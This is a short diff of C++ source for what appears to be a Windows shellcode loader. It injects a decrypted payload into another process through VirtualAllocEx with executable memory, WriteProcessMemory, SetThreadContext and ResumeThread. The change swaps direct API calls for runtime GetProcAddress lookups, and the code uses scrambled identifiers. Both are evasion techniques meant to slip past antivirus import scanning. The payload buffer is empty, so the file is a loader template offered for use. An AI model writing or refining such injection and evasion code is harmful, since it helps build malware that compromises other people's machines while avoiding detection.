@@ -36,15 +36,17 @@ int main() {
       
     cvx.ContextFlags = CONTEXT_FULL;
 
-    GetThreadContext(pi.hThread, &cvx);
+    auto pGetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(hKernel32, "GetThreadContext");
+    pGetThreadContext(pi.hThread, &cvx);
 unsigned char itsthecod345[] = {};
 
-    
+    //auto dynamic link
     auto pVirtualAllnocEkx = (LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(hKernel32, "VirtualAllocEx");
     LPVOID falpo = pVirtualAllnocEkx(pi.hProcess, NULL, sizeof(itsthecod345),MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     
     ases123enc((char*)  itsthecod345, sizeof(itsthecod345), ke185hams, sizeof(ke185hams));
-    
+
+    //manual dynamic link
     BOOL (*pWriteProcessM)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) =
     (BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))GetProcAddress(hKernel32, "WriteProcessMemory");
 
@@ -53,8 +55,8 @@ unsigned char itsthecod345[] = {};
 
     auto pSetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(hKernel32, "SetThreadContext");
     pSetThreadContext(pi.hThread, &cvx);
-
-    ResumeThread(pi.hThread); 
+    auto pResumeThread = (DWORD(WINAPI*)(HANDLE))GetProcAddress(hKernel32, "ResumeThread");
+    pResumeThread(pi.hThread); 
 
 
     return 0;
